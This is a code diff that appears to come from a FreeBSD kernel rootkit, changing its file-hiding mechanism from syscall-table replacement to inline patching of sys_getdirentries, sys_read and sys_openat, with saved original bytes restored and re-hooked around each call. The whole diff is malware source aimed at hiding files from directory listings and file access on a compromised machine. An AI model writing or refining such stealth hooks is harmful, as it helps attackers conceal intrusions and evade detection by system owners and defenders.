@@ -52,6 +52,10 @@ extern struct sx modules_sx;
 extern modulelist_t modules;
 extern int nextid;
 
+static char *openat_prepatch;
+static char *read_prepatch;
+static char *getdirentries_prepatch;
+
 struct module {
 	TAILQ_ENTRY(module) link;
 	TAILQ_ENTRY(module) flink;
@@ -245,7 +249,10 @@ getdirentries_hook(struct thread *td, void *syscall_args)
 	struct getdirentries_args *uap;
 	uap = (struct getdirentries_args *) syscall_args;
 
+	hook_set(sys_getdirentries, getdirentries_prepatch);
 	sys_getdirentries(td, syscall_args);
+	hook(sys_getdirentries, getdirentries_hook);
+
 	size = td->td_retval[0];
 
 	if (size > 0)
@@ -382,7 +389,10 @@ read_hook(struct thread *td, void *syscall_args)
 
 	struct read_args *uap;
 
+	hook_set(sys_read, read_prepatch);
 	ret_sys = sys_read(td, syscall_args);
+	hook(sys_read, read_hook);
+
 	if (ret_sys)
 	{
 		return(ret_sys);
@@ -484,7 +494,10 @@ openat_hook(struct thread *td, void *syscall_args)
 
 	uap = (struct openat_args *) syscall_args;
 
+	hook_set(sys_openat, openat_prepatch);
 	sys_ret = sys_openat(td, syscall_args);
+	hook(sys_openat, openat_hook);
+
 	fd = td->td_retval[0];
 
 	if (fd < 0)
@@ -532,15 +545,20 @@ openat_hook(struct thread *td, void *syscall_args)
 void
 hide_files(void)
 {
-	hook_syscall_set(SYS_getdirentries, getdirentries_hook);
-	hook_syscall_set(SYS_read, read_hook);
-	hook_syscall_set(SYS_openat, openat_hook);
+	getdirentries_prepatch = hook_fetch(sys_getdirentries);
+	hook(sys_getdirentries, getdirentries_hook);
+
+	read_prepatch = hook_fetch(sys_read);
+	hook(sys_read, read_hook);
+
+	openat_prepatch = hook_fetch(sys_openat);
+	hook(sys_openat, openat_hook);
 }
 
 void
 unhide_files(void)
 {
-	hook_syscall_set(SYS_getdirentries, sys_getdirentries);
-	hook_syscall_set(SYS_read, sys_read);
-	hook_syscall_set(SYS_openat, sys_openat);
+	hook_set(sys_getdirentries, getdirentries_prepatch);
+	hook_set(sys_read, read_prepatch);
+	hook_set(sys_openat, openat_prepatch);
 }
